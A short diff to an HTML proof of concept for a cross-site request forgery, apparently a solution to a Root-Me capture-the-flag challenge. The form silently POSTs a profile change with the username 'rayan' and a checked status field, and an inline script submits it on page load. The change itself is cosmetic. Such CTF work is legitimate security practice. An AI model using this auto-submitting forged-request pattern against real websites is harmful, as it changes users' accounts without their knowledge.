@@ -1,6 +1,6 @@
 <form  name="form" action="http://challenge01.root-me.org/web-client/ch22/index.php?action=profile" method="POST" enctype="multipart/form-data">
   <input type="text" name="username" value="rayan" />
-  <input type="checkbox" name="status" checked=checked />
-  <input type="submit" value="Submit request" />
+  <input type="checkbox" name="status" checked="checked" />
+  <input type="submit" value="Submit" />
 </form>
 <script>document.form.submit()</script>
